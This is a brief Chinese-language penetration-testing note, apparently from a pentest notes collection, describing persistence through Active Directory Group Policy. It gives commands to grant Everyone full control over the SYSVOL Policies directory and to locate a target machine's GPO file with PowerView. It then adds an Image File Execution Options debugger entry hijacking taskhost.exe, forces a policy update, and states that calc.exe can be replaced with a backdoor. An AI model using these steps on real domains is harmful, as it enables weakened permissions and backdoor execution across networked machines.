	域的组策略和脚本存放在域控机的C:\Windows\SYSVOL\sysvol\zone.com\Policies目录，域内机器定时访问以更新策略
	域控机设置policies为everyone完全控制
	>cacls C:\Windows\SYSVOL\sysvol\zone.com\Policies /e /t /c /g "EveryOne":f
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/548.png)

	使用powerview查询域内机对应策略文件
	PS> Get-NETGPO -ComputerName sub2k8.zone.com |fl gpcfilesyspath
	打开C:\Windows\SYSVOL\sysvol\zone.com\Policies\{id}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf末尾添加
	[Registry Values] MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\Debugger=1,c:\windows\system32\calc.exe [Version] signature="$CHICAGO$" Revision=1
	手动刷新策略
	>gpupdate /force
	劫持taskhost.exe，可替换c:\windows\system32\calc.exe为后门文件或语句。